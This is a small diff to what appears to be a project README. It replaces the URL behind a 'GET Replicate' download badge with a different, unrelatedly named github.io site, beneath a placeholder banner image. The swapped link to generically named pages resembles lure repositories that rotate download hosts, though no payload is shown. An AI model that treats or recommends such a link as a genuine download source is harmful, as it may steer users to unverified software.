@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=b887f85367c4c3ec07e64bf00aa5709c_sr-4327973-images-thumbs&n=13)
 
-[![GET Replicate](https://img.shields.io/badge/GET%20%E2%80%94%20Replicate-0078D6?style=for-the-badge&logoColor=white)](https://backup-and-restore-toolkit.github.io/.github/replicate-image)
+[![GET Replicate](https://img.shields.io/badge/GET%20%E2%80%94%20Replicate-0078D6?style=for-the-badge&logoColor=white)](https://virtual-machine-monitor-suite.github.io/.github/replicate-image)
 
 ---
 
